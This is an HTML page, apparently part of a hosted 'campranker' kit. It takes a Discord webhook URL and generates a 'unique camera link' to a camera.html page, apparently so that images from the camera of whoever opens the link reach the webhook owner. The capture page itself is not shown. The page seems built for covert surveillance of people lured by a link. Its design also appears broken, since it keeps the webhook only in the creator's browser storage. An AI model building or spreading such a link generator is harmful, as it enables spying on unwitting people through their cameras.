<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generate Your Unique Camera Link</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            color: white;
            background-color: #1e1e1e;
            text-align: center;
            padding: 50px;
        }
        input, button {
            padding: 10px;
            font-size: 1rem;
            border: none;
            border-radius: 10px;
        }
        input {
            width: 70%;
            margin-bottom: 20px;
        }
        button {
            background-color: #ff0099;
            color: white;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <h1>Generate Your Unique Camera Link</h1>
    <input type="text" id="webhookURL" placeholder="Enter your Discord Webhook URL" />
    <button onclick="generateLink()">Generate Link</button>
    <p id="generatedLink"></p>

    <script>
        // Function to generate a random 16-digit ID
        function generateRandomID() {
            return 'ID' + Math.random().toString(36).substr(2, 16).toUpperCase();
        }

        // Save the generated user ID and webhook URL in localStorage
        function generateLink() {
            const webhookURL = document.getElementById('webhookURL').value;

            if (webhookURL) {
                const userID = generateRandomID();
                // Store the webhook URL and userID in localStorage
                localStorage.setItem(userID, webhookURL);
                
                const generatedLink = `https://xxza1dxx.github.io/campranker/camera.html?userID=${userID}`;
                document.getElementById('generatedLink').textContent = `Your unique camera link: ${generatedLink}`;
            } else {
                alert("Please enter a valid Discord webhook URL.");
            }
        }
    </script>
</body>
</html>
